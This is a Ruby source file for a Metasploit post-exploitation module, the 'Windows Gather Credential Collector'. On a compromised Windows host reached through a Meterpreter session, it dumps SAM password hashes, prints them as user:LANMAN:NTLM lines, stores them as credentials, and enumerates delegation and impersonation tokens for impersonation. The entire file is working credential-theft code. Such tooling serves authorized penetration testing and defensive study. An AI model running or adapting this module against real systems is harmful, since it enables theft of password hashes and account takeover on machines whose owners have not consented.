##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather Credential Collector',
        'Description'   => %q{
          This module harvests credentials using Priv and stores
          them in the database, as well as enumerates tokens using Incognito.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
          'tebo[at]attackresearch.com', # Original version
          'todb' # Conversion to credential gem
        ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter']
      ))

  end

  # Run Method for when run command is issued
  def run
    print_status("Running module against #{sysinfo['Computer']}")
    # Collect even without a database to store them.
    db_ok = session.framework.db.active

    # Make sure we're rockin Priv and Incognito
    session.core.use("priv") if not session.priv
    session.core.use("incognito") if not session.incognito

    # It wasn't me mom! Stinko did it!
    hashes = client.priv.sam_hashes

    # Target infos for the db record
    addr = ::Rex::Socket.getaddress(client.sock.peerhost, true)

    # Record hashes to the running db instance
    print_good "Collecting hashes..."

    if db_ok
      service_data = {
        address: addr,
        port: 445,
        service_name: 'smb',
        protocol: 'tcp',
        workspace_id: myworkspace_id
      }
      session_data = {
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: self.refname,
        workspace_id: myworkspace_id
      }
    end

    hashes.each do |hash|
      user = hash.user_name
      pass = "#{hash.lanman}:#{hash.ntlm}"
      print_line "    #{user}:#{pass}"
      if db_ok
        credential_data = {
          username: user,
          private_data: pass,
          private_type: :ntlm_hash
        }
        credential_data.merge! session_data
        credential_core = create_credential(credential_data)
        login_data = {
          core: credential_core,
          status: Metasploit::Model::Login::Status::UNTRIED
        }
        login_data.merge! service_data
        create_credential_login(login_data)
      end
    end

    # List user tokens
    tokens = session.incognito.incognito_list_tokens(0)
    raise Rex::Script::Completed if not tokens

    # Meh, tokens come to us as a formatted string
    print_good "Collecting user tokens..."
    (tokens["delegation"] + tokens["impersonation"]).split("\n").each do |token|
      data = {}
      data[:host]      = addr
      data[:type]      = 'smb_token'
      data[:data]      = token
      data[:update]    = :unique_data

      print_line "    #{data[:data]}"
      report_note(data) if db_ok
    end
  end
end
